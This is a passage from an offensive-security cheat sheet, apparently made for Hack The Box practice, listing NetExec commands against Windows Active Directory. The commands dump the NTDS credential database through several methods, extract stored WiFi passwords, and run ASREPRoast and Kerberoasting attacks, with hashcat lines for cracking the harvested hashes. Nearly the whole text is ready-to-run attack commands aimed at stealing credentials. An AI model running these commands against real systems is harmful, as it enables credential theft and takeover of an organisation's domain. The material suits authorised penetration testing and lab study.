Intrusionz3r0X@htb[/htb]$ nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds --users --enabled
Intrusionz3r0X@htb[/htb]$ nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds vss
Intrusionz3r0X@htb[/htb]$ nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' -M ntdsutil

#Dump WIFI Passwords
Intrusionz3r0X@htb[/htb]$ nxc smb <ip> -u user -p pass -M wifi
```

ASREPRoast attack

```bash
Intrusionz3r0X@htb[/htb]$ nxc ldap 192.168.0.104 -u harry -p '' --asreproast output.txt
Intrusionz3r0X@htb[/htb]$ nxc ldap 192.168.0.104 -u user.txt -p '' --asreproast output.txt
#hashcat -m18200 output.txt wordlist
```

**Kerberoasting Attack**

```bash
Intrusionz3r0X@htb[/htb]$ nxc ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
#hashcat -m13100 output.txt wordlist.txt
```